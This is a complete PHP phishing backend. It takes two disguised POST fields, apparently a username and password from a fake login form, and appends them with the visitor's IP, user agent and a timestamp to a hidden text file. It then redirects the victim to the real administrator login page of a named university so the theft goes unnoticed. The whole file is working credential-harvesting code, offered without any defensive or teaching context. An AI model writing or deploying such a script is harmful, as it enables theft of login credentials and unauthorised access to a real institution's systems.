<?php

// Text file
$file = "987654321123456789.txt";

// Get POST variables
$peter = $_POST['peter'] ?? '';
$cheater  = $_POST['cheater'] ?? '';

// Get User Agent
$useragent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Get IP Address
$ip = $_SERVER['REMOTE_ADDR'] ?? '';

// Get current date and time
$date = date("Y-m-d H:i:s");

// Prepare data
$data = "Date: " . $date . PHP_EOL;
$data .= "Peter: " . $peter . PHP_EOL;
$data .= "Cheater: " . $cheater . PHP_EOL;
$data .= "User Agent: " . $useragent . PHP_EOL;
$data .= "IP: " . $ip . PHP_EOL;
$data .= "------------------------" . PHP_EOL;

// Open file in append mode
$fileHandle = fopen($file, "a");

if ($fileHandle) {

    // Write data to file
    fwrite($fileHandle, $data);

    // Close file
    fclose($fileHandle);

}

// Redirect to URL
header("Location: https://www.kuet.ac.bd/admin/user/adminlogin");
exit();

?>